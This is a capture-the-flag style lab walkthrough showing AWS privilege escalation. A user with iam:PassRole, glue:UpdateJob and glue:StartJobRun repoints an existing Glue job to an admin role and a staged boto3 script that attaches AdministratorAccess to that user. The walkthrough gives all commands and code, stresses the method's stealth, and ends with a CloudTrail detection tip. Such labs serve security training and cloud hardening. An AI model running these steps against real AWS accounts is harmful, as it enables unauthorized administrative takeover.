# Guided Walkthrough: Privilege Escalation via iam:PassRole + glue:UpdateJob + glue:StartJobRun

This scenario demonstrates a privilege escalation vulnerability where a user with `iam:PassRole`, `glue:UpdateJob`, and `glue:StartJobRun` permissions can modify an existing AWS Glue ETL job to execute with an administrative role and malicious Python code that grants the starting user administrative access.

Unlike the `glue:CreateJob` privilege escalation technique (glue-003) where an attacker creates a new Glue job, this scenario exploits the ability to **update an existing job** that already exists in the environment. This approach can be stealthier because existing Glue jobs are common in production environments running legitimate ETL workloads, updating a job generates different CloudTrail events than creating new resources, security monitoring may focus more on resource creation than modification, and the attack can blend in with normal job maintenance activities.

When updating a Glue job, an attacker can change both the IAM role the job uses (via `iam:PassRole`) and the script location. By pointing the job to a malicious Python script and passing an administrative role, they can execute arbitrary code with elevated privileges when the job runs. This is part of the "PassRole + Service" privilege escalation family, demonstrating how AWS Glue's flexibility becomes a security risk when update permissions are not properly restricted.

## The Challenge

You start as `pl-prod-glue-005-to-admin-starting-user`, an IAM user with credentials provided via Terraform outputs. This user has three permissions that, in combination, form a critical privilege escalation path:

- `iam:PassRole` on `arn:aws:iam::{account_id}:role/pl-prod-glue-005-to-admin-target-role`
- `glue:UpdateJob` on `*`
- `glue:StartJobRun` on `*`

Your goal is to reach full administrative access, represented by the `pl-prod-glue-005-to-admin-target-role` role which has `AdministratorAccess`. There is already a Glue job deployed in this account — `pl-glue-005-to-admin-job` — running with a non-privileged initial role and a benign script. You need to turn that job into your escalation vehicle.

## Reconnaissance

First, confirm who you are and that you do not yet have admin access:

```bash
aws sts get-caller-identity --query 'Arn' --output text
# arn:aws:iam::{account_id}:user/pl-prod-glue-005-to-admin-starting-user

aws iam list-users --max-items 1
# AccessDenied — good, no admin yet
```

Next, discover the pre-existing Glue job and inspect its current configuration:

```bash
aws glue get-job --job-name pl-glue-005-to-admin-job
```

The output will show the job is running with `pl-prod-glue-005-to-admin-initial-role` (a non-privileged role with only `AWSGlueServiceRole` permissions) and a benign script stored in S3. This is the legitimate baseline configuration.

At this point you know:
- There is an existing Glue job you can modify.
- You have `glue:UpdateJob` to change its role and script.
- You have `iam:PassRole` on the admin target role, meaning you can hand that role to the Glue service.
- You have `glue:StartJobRun` to trigger execution.

## Exploitation

### Step 1: Update the job to use the admin role and a malicious script

The malicious script is already staged in the scenario's S3 bucket at `s3://pl-glue-scripts-glue-005-{account_id}-{suffix}/escalation_script.py`. It contains Python code that uses boto3 to attach `AdministratorAccess` to the starting user:

```python
import boto3
iam = boto3.client('iam')
iam.attach_user_policy(
    UserName='pl-prod-glue-005-to-admin-starting-user',
    PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
)
```

Now update the job to swap in the admin role and the malicious script:

```bash
aws glue update-job \
  --job-name pl-glue-005-to-admin-job \
  --job-update "Role=arn:aws:iam::{account_id}:role/pl-prod-glue-005-to-admin-target-role,Command={Name=pythonshell,ScriptLocation=s3://pl-glue-scripts-glue-005-{account_id}-{suffix}/escalation_script.py,PythonVersion=3.9},DefaultArguments={--job-language=python},MaxCapacity=0.0625,Timeout=5"
```

This call succeeds because you hold `glue:UpdateJob` and `iam:PassRole` on the target role. The Glue service accepts the role change because the role's trust policy permits `glue.amazonaws.com` to assume it.

### Step 2: Trigger execution

```bash
aws glue start-job-run --job-name pl-glue-005-to-admin-job
```

Capture the `JobRunId` from the response and monitor progress:

```bash
aws glue get-job-run \
  --job-name pl-glue-005-to-admin-job \
  --run-id <JobRunId> \
  --query 'JobRun.JobRunState' \
  --output text
```

The job typically completes in 1-2 minutes. Poll until you see `SUCCEEDED`.

## Verification

After the job succeeds, wait ~15 seconds for IAM policy propagation, then confirm administrative access:

```bash
aws iam list-attached-user-policies \
  --user-name pl-prod-glue-005-to-admin-starting-user \
  --query 'AttachedPolicies[*].PolicyArn' \
  --output text
# arn:aws:iam::aws:policy/AdministratorAccess

aws iam list-users --max-items 3
# Success — you now have full admin access
```

## Capture the Flag

Admin access isn't the finish line — the flag is. Every Pathfinding Labs scenario stores a flag in a well-known location, and retrieving it is how you prove the end-to-end attack worked. For `to-admin` scenarios like this one, the flag lives in AWS Systems Manager Parameter Store at a predictable path under `/pathfinding-labs/flags/`. Reading it requires `ssm:GetParameter` on that specific parameter, which the `AdministratorAccess` managed policy now granted to your starting user provides implicitly.

Using your starting user credentials (which, thanks to the previous step, now hold `AdministratorAccess`), read the flag:

```bash
aws ssm get-parameter \
    --name /pathfinding-labs/flags/glue-005-to-admin \
    --query 'Parameter.Value' \
    --output text
# flag{...}  — your scenario-specific flag value
```

The value printed is the flag you submit to complete the challenge. Its exact contents are deployment-specific (the default ships in `flags.default.yaml` in the repo root; vendors running hosted labs can swap in their own set via `plabs init --flag-file` or `plabs flags import`). The retrieval mechanism and path are identical across every `to-admin` scenario, so this same command works as the final step for any of them — only the scenario ID in the path changes.

## What Happened

You exploited the combination of three permissions that individually seem reasonable but together create a complete privilege escalation path. `iam:PassRole` let you hand an administrative IAM role to the Glue service. `glue:UpdateJob` let you redirect an existing job to use that role and execute attacker-controlled code. `glue:StartJobRun` let you pull the trigger.

In a real production environment this attack is particularly dangerous because it modifies an existing resource rather than creating a new one. Defenders monitoring for new Glue job creation would miss it entirely. The job appeared legitimate before the attack; the only tell is the `UpdateJob` event in CloudTrail with a role ARN change and an unexpected script location — exactly the kind of subtle signal that gets buried in noise during incident response.
